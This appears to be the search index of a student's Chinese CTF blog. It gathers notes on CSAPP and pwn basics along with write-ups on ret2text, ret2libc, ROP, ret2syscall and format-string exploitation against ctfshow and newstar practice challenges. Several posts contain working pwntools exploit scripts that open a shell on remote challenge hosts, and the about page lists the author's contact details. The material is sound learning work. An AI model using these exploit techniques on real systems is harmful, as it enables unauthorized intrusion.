<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn前置基础大合集（更新中）</title>
    <url>/posts/e5ae4e99.html</url>
    <content><![CDATA[这篇博客主要是记录一下pwn的底层知识，主要知识来来自CSAPP，维基百科，b站网课等
操作系统1.发展历史1969 UNIX系统 肯尼斯·蓝·汤普森&amp;丹尼斯·麦卡利斯泰尔·里奇奠定了现代操作系统，“一切皆文件”
1984 ios mac 苹果操作系统1985 window1.01991 linux 开源免费
2.LINUX下计算机的控制流程用户——应用软件——操作系统——驱动程序——硬件，从左到右逐层调用，其中操作系统包括系统软件和系统内核，内核负责管理它负责直接管理系统的进程、内存、设备驱动程序、文件和网络系统
这里我还是觉得CSAPP讲的非常好，于是结合CSAPP讲一下
刚才讲了，计算机的控制是逐层调用的，所以可以把操作系统看作是是应用程序和硬件之间的一层软件，应用程序必须通过操作系统访问处理器，主存，I&#x2F;O设备等硬件
因此，操作系统的两大功能是确保上层的应用软件既能控制，又不滥用下层的硬件
操作系统通过进程、虚拟内存和文件来实现两大功能
进程 
虚拟内存 见CSAPP第二章
文件 权限的体现：可读可写可执行 可读可写不可执行 可读不可写不可执行
]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
  </entry>
  <entry>
    <title>64位下的ret2libc</title>
    <url>/posts/3f2930dc.html</url>
    <content><![CDATA[写在前面：这种类型的题其实不好归纳是ret2text还是ret2libc，我这里按照ctfshow的分类方法，将存在完整可执行的system(bin&#x2F;sh)后门函数的题型归纳为ret2text，将需要利用基本的ROP技术的题型归纳位ret2libc
我们知道，在32位系统下，参数是直接被放在栈上的，不需要寄存器，因此只需要简单的覆盖到后门函数地址即可，但是在64位系统下则不一样了
64位系统的函数调用约定linux下64位系统采用System V AMD64调用约定，这里我会在阅读完CSAPP第三章后做更加详细的解释，下面是一些简要解释
参数传递方式


参数编号
寄存器



第 1 个
RDI


第 2 个
RSI


第 3 个
RDX


第 4 个
RCX


第 5 个
R8


第 6 个
R9


函数的前六个参数从右往左先被存入寄存器，再通过call调用函数

foo(1, 2, 3, 4, 5, 6, 7);


mov rdi, 1mov rsi, 2mov rdx, 3mov rcx, 4mov r8,  5mov r9,  6push 7 #第七个参数压入栈call foo

有system函数和bin&#x2F;sh字符串eg：ctfshow pwn40int __cdecl main(int argc, const char **argv, const char **envp)&#123;  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  puts(asc_400828);  puts(asc_4008A0);  puts(asc_400920);  puts(asc_4009B0);  puts(asc_400A40);  puts(asc_400AC8);  puts(asc_400B60);  puts(&quot;    * *************************************                           &quot;);  puts(aClassifyCtfsho);  puts(&quot;    * Type  : Stack_Overflow                                          &quot;);  puts(&quot;    * Site  : https://ctf.show/                                       &quot;);  puts(&quot;    * Hint  : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;);  puts(&quot;    * *************************************                           &quot;);  puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;);  ctfshow();  puts(&quot;\nExit&quot;);  return 0;&#125;

ssize_t ctfshow()&#123;  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF  return read(0, buf, 0x32uLL);&#125;

ctfshow函数存在明显栈溢出，偏移量为0xA+0x8
左侧的函数窗口是有system函数的，我们可以看到它在plt表里的地址
我们找的是plt表的地址，而不是got表，两个地址有一定要区别开

shitf加f12查看字符串，存在bin&#x2F;sh字符串

下面的是就很简单了，首先是把bin&#x2F;sh字符串传到第一个寄存器rdx里，然后想rdi寄存器指向system函数即可

用之前讲的ROPgadget指令找到pop rdi

ROPgadget –binary pwn –only “pop|ret”|grep rdi


ROPgadget –binary pwn42 –only “ret”

为了栈对齐，我们必须在pop rdi后加一个ret
exp如下：
from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28105)payload = b&#x27;a&#x27;*(0xA+8)payload += p64(0x4007e3) #pop rdipayload += p64(0x400808) #bin/shpayload += p64(0x4004fe) #retpayload += p64(0x400520) #systemio.sendline(payload)io.interactive()

成功执行system bin&#x2F;sh

有system函数和sh字符串eg2：ctfshow pwn42这个题的payload和pwn40一模一样，具体参考之前写的初识ret2libc（32位），考点还是用sh替代bin&#x2F;sh字符串，无非是改了几个地址而已，因此不再贴题目内容和具体过程了
from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28103)payload = b&#x27;a&#x27;*(0xA+8)payload += p64(0x0000000000400843) #pop rdipayload += p64(0x0000000000400872) #用sh替代bin/shpayload += p64(0x000000000040053e) #retpayload += p64(0x0000000000400560) #systemio.sendline(payload)io.interactive()


]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP第二章札记（更新中）</title>
    <url>/posts/d4f00467.html</url>
    <content><![CDATA[信息的存储二进制起源悠久，可以追溯到埃及，印度巴拉巴拉，莱布尼茨进行了系统的发展，后由乔治·布尔进一步完善
相比十进制更容易表示，存储和传输，比如高电压表示1，低电压表示0
编码无符号编码 大于等于零的数补码 带正负号的整数浮点数 
信息存储和十六进制表示法程序将内存看成一个很大的字节数组，称为虚拟内存内存的每一个字节由唯一的数字来标识，称为它的地址所有地址的集合，称为虚拟内存空间
在C语言中，我们可以通过指针引用数组元素，指针的值即某个对象的位置
1个字节（byte）或者说块，由8个位（bit）组成，一个位由0或1两种可能，最大是全部为1，即11111111；最小是0，即00000000。那么如果用十进制表示，最大值为255
字节作为计算机可寻址的最小单位，而并不是位
0x开头表示16进制（hex），具体的转换可以查询表格
字数据大小字长字（word），是CPU一次能处理的数据宽度单位  
字长（Word Length），是字所用单位的大小，是CPU一次能处理字节（或位）的长度，也通常是一个寄存器的宽度。比如，32位系统可以一次处理字长为32位，即字4个字节的数据，64位系统可以一次处理字长为64位，即8个字节的数据
字长决定了虚拟地址最大的空间大小，最大为2的字长次方-1，程序最多访问2的字长次方大小的数据，如32位系统，虚拟内存空间的大小就是2的32次方个位，即4GB，64位系统为16EB
32位和64位程序的最大区别在于程序是如何编译的，而不是运行的机器类型，因为64位机器可以向下兼容32位，反之却不行，并且，这和操作系统，CPU等硬件都无关
数据类型
long即long int，表示长度更长的整数。所以我们通常用int就够了
寻址和字节顺序对于多字节的程序对象，我们必须明确：  
1.这个对象地址在哪里（如何寻址）2.在内存中按什么顺序排列他们（字节顺序是什么）
不同的机器，从存储字节的顺序也不一样，主要有两种方式，大端序和小端序
大端序将最高有效字节置于更高的地址，小端序将最低有效字节置于更高的地址
这很好理解，我们取一个int类型的整数，值为0x12345678，将它置于0x100地址处，int类型占四个字节，那么需要在内存里划分出0x100到0x103的内存大小，大端序下，12被置于0x100处，78被置于0x103处，小端序则相反，12被置于0x103处,78被置于0x100处
x86处理器采用小端序
网络传输一般采用大端序，也被称之为网络字节序，或网络序。IP协议中定义大端序为网络字节序
*关于字节顺序的后两种情况我其实没太看懂，分别是阅读表示整数数据的字节序列时字节顺序，当编写规避正常的类型系统的程序，这里先按下不表
表示字符串C语言中，字符串被编译为以NULL结尾的字符数组
比如我们有一个abcde的字符串，在字符数组中实际上是a b c d e NULL长度为6个字节
NULL的十六进制表示为0x00，而字符串由ASCII字符编码，因此不需要考虑字节顺序，这就让文本数据比二进制数据有更强的平台独立性
布尔代数布尔通过将逻辑值 TRUE（真）和FALSE（假）编码为二进制值1和0, 设计出一种代数，以研究逻辑推理的基本原则

简单来说，就是
非¬非0即为1，非非0即为0
与∧全1为1，不全1为0（只有两个条件中同时为真，结果才为真）
或∨全0为0，不全0为1（只要两个条件中有一个为真，结果就为真）
异或⊕相同为0，不同为1
用集合理解和表示布尔运算
任取{76543210}1：第n位是集合中的一个元素0：反之

Not（非门）补集And（与门）取交集Or（或门）取并集Xor（异或）对称差异   

eg01101001：{0356}01010101：{0246}not{1 3 5 7}and：{0 6}or;：{0 2 3 4 5 6}xor {2 3 4 5}  
C语言的运算位级运算C语言支持对每一个位进行布尔运算

| or&amp; and~ not^ xor

在位级运算中，先将十六进制转换为二进制进行运算，运算完再将二进制结果转换为十六进制结果
位级运算常用于掩码运算，比如子网掩码，这一块后面学到了再说
逻辑运算
逻辑运算符|| OR&amp;&amp; AND!  NOT  

在C语言的逻辑运算中，所有非零参数均为1，而0依然表示false，最后仍返回1或0
比如：！0x114514，返回值为0x000x114514&amp;&amp;0x1234，返回值为0x010x114514||0x1234，返回值为0x00
移位运算左移把操作数x向左移k位，需要丢弃最高的k位置，并在右端补k个0（二进制中，最高位是最左边的位）
eg：01100011，左移2位为10001100
右移右移分为逻辑右移和算术右移，逻辑右移和左移只是方向不同
算术右移需要特别注意。如果最高位是0，算术右移和逻辑右移相同，但如果最高位是1，那么最后需要补1，而不是0
对有符号数，几乎都使用算术右移，对无符号数，一定是逻辑右移
整数表示

通过查看32位和64位系统存储的整数范围，我们可以发现几个问题：1.long类型在32位和64位下，存储范围存在明显差异2.有符号整数的存储范围并不关于0对称，而是负数的范围比正数大1
我们一个一个来看这是为什么
1.由于C语言设计之初，电脑的字长多种多样，无法统一，于是C语言为了在不同机器上都能运行，只规定了各整数类型的大小顺序，这样，编译器可以根据机器的不同灵活调整

2 ≤ short ≤ int ≤ long ≤ long long

实际上，在16位机器的时代，int可以只占2个字节，但到了今天，在32位或者64位机器上则都占4字节，而最大的不同就是long和long long，C语言规定比int大就可以，所以在32位机器上和int一样占4字节，没有什么区别，但是在64位上占8个字节，存放数据的大小也变大了非常多
2.见下面的补码
不同数据的编码无符号数的编码这一块的内容书上说了很多，而且很晦涩，其实本质上是按权展开，即无符号表示的数值，就是它的二进制按权展开的结果
补码的编码有符号数的表示方式为补码
将最高位称为符号位，它具有负权重，权重为-2的w-1次方，显然，最高位为1，权重为0，最高位为0时，
拿1 -1 5 -5举例

我们用0000 0000表示0，负数没有−0，而最小的 1000 0000被拿来表示−128，这就导致了负数比整数多一个的情况



符号
数量



负数
128 个（−128 ～ −1）


0
1 个


正数
127 个（+1 ～ +127）


]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
  </entry>
  <entry>
    <title>ret2text小tips</title>
    <url>/posts/1111.html</url>
    <content><![CDATA[exp模板
from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A&quot;*264 + p64(0x401202)io.sendline(payload)io.interactive()

264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址
注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位
]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>ret2text</tag>
      </tags>
  </entry>
  <entry>
    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
    <url>/posts/d4f00467.html</url>
    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
看一下左下角的时间，如果是now那就证明保存了
另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
最后，感谢我磊哥再一次救我
]]></content>
      <categories>
        <category>碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>初识ROP</title>
    <url>/posts/2b89d936.html</url>
    <content><![CDATA[如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。
何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。

出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。
接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。
所以ROP就是一项通过构造一系列的gadget实现攻击的技术。
再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。
静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。
PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。
接下来我以CTFshow的pwn入门43题讲解一下ROP的使用

这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令

果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去
context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)io = process(&quot;./pwn43&quot;)gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420           break *0x08048450&#x27;&#x27;&#x27;)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;A&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)payload += p32(buf2)payload += p32(buf2)io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()

来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell
我们用gdb调试一下，验证这段exp是否正确。
我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前

这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序
我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2

我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了

总结本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等
]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>初识ret2syscall</title>
    <url>/posts/f376ffe3.html</url>
    <content><![CDATA[系统调用操作系统的进程空间可分为用户空间和内核空间，它们需要不同的执行权限。其中系统调用运行在内核空间
在电脑中，系统调用（英语：system call），指运行在用户空间的程序向操作系统内核请求需要更高权限运行的服务
我们要知道，系统调用和库函数调用是两回事，系统调用由操作系统内核提供，运行于内核核心态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。
应用程序调用系统调用的过程是：
1.把系统调用的编号存入EAX2.把函数参数存入其它通用寄存器3.触发 0x80 号中断（int 0x80）  
在这里我以32位系统为例，一个经典的系统调用如下
mov eax,0xbmov ebx,[&quot;/bin/sh&quot;]mov ecx,0mov edx,0int 0x80

查找对应的函数调用表，我们知道0xb对应的是execve指令，然后将bin&#x2F;sh字符串写入寄存器ebx中，剩下几个寄存器为空。当我们触发int 0x80软中断后，CPU会切换到内核态，会先从eax读到函数调用号0xb，然后读到参数bin&#x2F;sh字符串，这一顿操作下来等价于execve(“bin&#x2F;sh”,NULL,NULL)，最后执行ret指令切换回用户态

系统调用表可以在以下几个网站查找https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64
https://syscalls.mebeim.net/?table=x86/64/x64/latest
ret2syscall实战eg：newstar2025 week2 syscall
题目内容：远在Hong Kong 的朋友常说“虽然世界给他关上了门，但同时又开了一扇窗”



先不管ret2syscall，我们可以看到在func函数里的是存在明显的栈溢出漏洞的，偏移量为0x12+0x4，即22
这类题有什么特征呢，打开ida，我们可以看到有茫茫多的函数，用得上用不上的都放上去了,很显然，该可执行文件是静态链接的


这就有一个好处了，这些茫茫多的函数给我们提供了很多gadget，可以帮助我们构造ROP
从这么多gadget里手动找到我们想要的几段肯定是不现实的，我们可以用ROPgadget帮我们找

ROPgadget –binary 文件名 –only ‘pop|ret’ | grep ‘eax’


我们的四个寄存器也以此就位了，分别是

pop_eax &#x3D; 0x080b438apop_ebx &#x3D; 0x08049022pop_ecx &#x3D; 0x0804985apop_edx &#x3D; 0x0804985c

我们还缺int80和&#x2F;bin&#x2F;sh字符串
我们找到了int80的地址

int_0x80 &#x3D; 0x08073a00

但是程序里没有给我们&#x2F;bin&#x2F;sh字符串。在之前的ret2libc里我们同样遇到了这种情况，我们要做的是自己sendline一个&#x2F;bin&#x2F;sh字符串，这时候我们依然可以借助系统调用，调用出read供我们使用
查询32位的系统调用表，我们知道read函数的系统调用号是0x3，关于三个参数分别是0，随便的一段.bss段，0x20，分别是什么意思可以看下面的链接，写的很详细了https://blog.csdn.net/m0_74091159/article/details/142261052
from pwn import * context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;) elf = ELF(&#x27;./syscall&#x27;) io = remote(&#x27;39.106.48.123&#x27;,26282) #io=process(&#x27;./pwn&#x27;) offset = 22 pop_eax = 0x080b438a pop_ebx = 0x08049022 pop_ecx = 0x0804985a pop_edx = 0x0804985c int_0x80 = 0x08073a00 bss_addr = elf.bss() read_addr = elf.symbols[&#x27;read&#x27;] payload = cyclic(offset)payload+=p32(pop_eax)payload+=p32(0x3)payload+=p32(pop_edx)payload+=p32(0x20)payload+=p32(pop_ecx)payload+=p32(bss_addr)payload+=p32(pop_ebx)payload+=p32(0)payload+=p32(int_0x80)payload+=p32(pop_eax)payload+=p32(0xb)payload+=p32(pop_edx)payload+=p32(0)payload+=p32(pop_ecx)payload+=p32(0)payload+=p32(pop_ebx)payload+=p32(bss_addr)payload+=p32(int_0x80) io.sendlineafter(&quot;pwn it guys!\n&quot;,payload) io.sendline(&#x27;/bin/sh\x00&#x27;) io.interactive()


总结通过学习ret2syscall，我们了解了ret2syscall这类题的基本特征，重点了解了什么是系统调用，以及如何进行系统调用，对gadget和ROP技术的利用有了更加深入的理解
]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>ret2syscall</tag>
      </tags>
  </entry>
  <entry>
    <title>初识ret2libc</title>
    <url>/posts/b342ee9.html</url>
    <content><![CDATA[从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。
ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处
egctfshow pwn入门39&amp;41这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh
首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的


这段payload首先填充了buf，然后把system地址改到了返回地址，然后把system的ret用四个字节填充了。为什么要填充4个字节呢，我们知道，32位系统传参是用栈传递的，我们用call调用函数时，call会把函数的返回地址压入栈中，函数调用结束后会执行ret指令，回到返回地址处。但我们并不希望system函数返回到某处，因此将返回地址填充上所谓的“虚假地址”，而返回地址往后是system函数的一参，也是我们希望sh在的地方。因此接下来把sh写到system函数的一参，就可以执行shll了

]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>初识格式化字符串（下）</title>
    <url>/posts/7e846c6a.html</url>
    <content><![CDATA[在上一篇文章中，我们了解了如何利用格式化字符串漏洞实现任意读,主要靠%d，%s等格式化占位符泄露内存。接下来介绍一下如何实现任意写，即覆盖内存
开挂的%n%n是一个很牛的格式化占位符，和%d，%s等占位符不一样,它不输出字符，而是把已经成功输出的字符个数写入对应的整型指针参数所指的变量
换句话说，它会将已打印的字符个数输出至格式化参数对应的地址中

printf(“包含%n的格式字符串”, …, &amp;变量名);

比较特殊的是，%n对应的参数必须是一个指向整数的指针
#include &lt;stdio.h&gt;int main() &#123;    int count;    printf(&quot;Hello, world!%n\n&quot;, &amp;count);    printf(&quot;上面那行输出了 %d 个字符。\n&quot;, count);    return 0;&#125;

输出结果是：Hello, world!上面那行输出了 13 个字符。
也就是说%n统计了前面字符串的字符数，并且让count&#x3D;1
利用%n覆盖内存实战主要分以下三个步骤：1.确定覆盖地址2.确定相对偏移3.进行覆盖  
eg2.ctfshow pwn入门91
logo函数打印了一些欢迎词，不用管。然后是ctfshow函数，下面判断了daniu的值是否等于6，如果是，那么我们就能执行system&#x2F;bin&#x2F;sh。  
我们进ctfshow函数看一下

首先定义了一个大小为80的数组（缓冲区）s，memset清空重置了s的内容，有一个read函数可以往s里读入数据。重点是下面的printf函数，明显是存在格式化字符串漏洞的，再下面的printf函数可以打印出目前daniu的值

我们看一下daniu，这里的？就说明其初始值为0，而位于.bss段则是可读可写的
下面我们的目的就是将daniu的值覆盖为6，覆盖地址确定了，下面我们来求偏移量。什么是偏移量，就是我们利用格式化字符串漏洞写入数据时，我们并不知道是从printf的第几个参数开始写的，我们这里要找到我们是从第几个参数
有以下两种方法
手测
aaaa在16进制里是0x61616161，从aaaa往后数的第7个地址是0x61616161，证明我们可以在第7个参数往后读
这种方法比较无脑，但是存在一个问题是如果限制我们输入%p的数量，那就不好找偏移量了。于是就有了我们的第二个方法
指令在pwndbg里有一个叫fmtarg的插件，可以自动帮我们计算偏移量，但是我的虚拟机里没有装这个插件，所以就不演示了，而且我个人更喜欢手测，所以如果以后遇到这种特殊情况再说
有了覆盖地址和偏移量，我们就可以进行覆盖了
from pwn import *io = remote (&#x27;pwn.challenge.ctf.show&#x27;,28271)#offset = 7daniu_addr = 0x0804B038payload = p32(daniu_addr) + b&#x27;aa%7$n&#x27;io.sendline(payload)io.interactive()

我们来逐步理解一下这段payload前面我们提到，%n对应的参数必须是一个指向整数的指针,也就是必须是一个地址
我们前面已经测试过了，如果我们要通过read去写入字符串，是从栈上的第七个参数开始的写，因此，我们是通过read函数，daniu_addr写到了栈上的第七个参数上
然后到了第一个printf函数上，printf的第一个参数是s的第一个参数，也就是我们通过read传入的格式化字符串”\x38\xb0\x04\x08 a a %7$n”，我们需要利用的是printf函数里的%7$n这个特性，
我们可以将%7$n理解为连续7个%n，但是最终起作用的是第7个%n，很显然%7$n需要找printf的第七个参数的地址，这个时候就必须去栈里寻找，前六个参数都是我们之前说的”奇怪的数”，也就是随机从栈上或者寄存器里取的，但是到了栈空间上第七个参数的位置就不一样了，我们通过read函数将daniu_addr写进了栈空间上的第七个参数，那么%7$n就非常开心了，他就会将目标地址锁定为daniu_addr
让我们把视角拉回printf函数，%7$n前有几个字符呢，我们将daniu_addr打包成了4个字符，加上我们手动输入的两个字符的aa，这一共是6个字符，于是printf函数开始的%7$n开始发力了，它统计到它之前有6个字符，并将数值6赋给了它指向地址对应的参数，也就是让daniu&#x3D;6
特别容易混淆的是printf的参数和寄存器上的参数，他俩并不是一回事，一定要区分好。printf的一参永远是格式化字符串，read读进去的位置是寄存器的第x个参数的地址，是%x$n所取的地址，这里的x就是我们算的偏移量。
最后我们通过输出也可以看到daniu的值被改成了6
总结格式化字符串漏洞存在的标志比较明显，目前我们初步认识了如何利用%d，%s等读，利用%n写。下一步，格式化字符串还会发挥出什么奇效呢，让我们拭目以待
]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>梦开始的地方</title>
    <url>/posts/1234.html</url>
    <content><![CDATA[我的博客搭建终于好了！
从今天起，我会在我的博客上分享我的wp，以及一些CTF的日常，希望和大家一起多多交流！
]]></content>
      <categories>
        <category>碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>初识格式化字符串（上）</title>
    <url>/posts/c6380b0f.html</url>
    <content><![CDATA[深入理解格式化字符串要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如printf(&quot;%d %f\n&quot;, x, y);，它的一参是x吗？
让我们来看看printf的声明，int printf(const char *format, ...)，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的
我们必须要深刻理解的第二个问题是，什么是格式化字符串

格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。

（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）
通俗的说，它就是包含格式化占位符的字符串
格式化字符串的工作原理我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数
这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。
#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b,c);return 0;
在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据
#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b);return 0;
而我们去掉了参数c会发生什么呢
结果会是：1 2 一个很奇怪的数
因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的
#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %p&quot;,a,b);return 0;

我们把占位符改成%p，输出的结果就是c在栈上的地址
#include&lt;stdio.h&gt;char a[]scanf(&quot;%s&quot;,&amp;)printf(a);return 0;
更极端的情况如上
因此，我们可以利用格式化字符串实现可读可写
eg1：newstar2025 week2 刻在栈上的秘密
题目内容：欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？

这个题没有给我们可执行文件，直接nc链接做即可

我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的

下面开始正式做题

我们可以看到，第11个%p打印出了密码所在寄存器的地址


总结格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容
]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>用gdb的动态视角看ret2text的实现</title>
    <url>/posts/2ee84d32.html</url>
    <content><![CDATA[来看一道非常简单的栈溢出

后门函数地址ida里很明显，0x8048521
exp本身不难写,下面看一下怎么用gdb确定偏移
from pwn import*io=process(&quot;./pwn&quot;)#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);gdb.attach(io,&quot;b main&quot;) #在main函数下断点payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)io.sendline(payload)io.interactive()



0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）
用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量
我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址

]]></content>
      <categories>
        <category>pwn入门</category>
      </categories>
      <tags>
        <tag>ret2text</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/%E6%9C%AA%E5%91%BD%E5%90%8D.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>分类</title>
    <url>/archive/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/about/index.html</url>
    <content><![CDATA[关于我基本信息SDUST 大一学生CTFer 主要方向为pwn

兴趣爱好足球 主队是山东泰山和曼城板绘 爱画一些二次元妹子，但实际上是个现充在看的书 《深入理解计算机系统（CSAPP）》

联系我QQ 1935572185163邮箱 lzr20061008@163.com
]]></content>
  </entry>
  <entry>
    <title>标签</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/css/custom.css</url>
    <content><![CDATA[/* @font-face {
  font-family: Candyhome;
  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);
